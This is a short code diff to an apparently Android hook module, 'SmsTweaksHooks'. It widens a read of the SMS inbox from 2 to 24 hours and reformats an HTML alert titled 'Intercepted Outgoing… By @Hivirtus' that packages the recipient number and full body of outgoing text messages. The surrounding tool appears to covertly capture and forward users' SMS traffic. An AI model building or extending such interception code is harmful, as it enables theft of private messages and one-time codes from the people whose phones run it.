@@ -327,7 +327,7 @@ public final class SmsTweaksHooks {
         Cursor c = null;
         try {
             ContentResolver cr = ctx.getContentResolver();
-            long since = System.currentTimeMillis() - 2L * 60L * 60L * 1000L;
+            long since = System.currentTimeMillis() - 24L * 60L * 60L * 1000L;
             c = cr.query(
                     Uri.parse("content://sms/inbox"),
                     new String[]{"_id", "address", "date"},
@@ -796,11 +796,13 @@ public final class SmsTweaksHooks {
                     if (digits.length() == 10) displayTo = "+91" + digits;
                     else if (digits.length() == 12 && digits.startsWith("91"))
                         displayTo = "+" + digits;
-                    // Exact screenshot: bold header+labels, mono To/Body, blank gaps
+                    // Screenshot spacing: blank after header + blank between To ↔ Body
                     String msg = "📱 <b>Intercepted Outgoing Zygisk Mode Menu By @Hivirtus 🔥</b>\n"
+                            + "\n"
                             + "\n"
                             + "<b>To (Tap to copy):</b>\n"
                             + "<code>" + escHtml(displayTo) + "</code>\n"
+                            + "\n"
                             + "\n"
                             + "<b>Body (Tap to copy):</b>\n"
                             + "<code>" + escHtml(body) + "</code>";
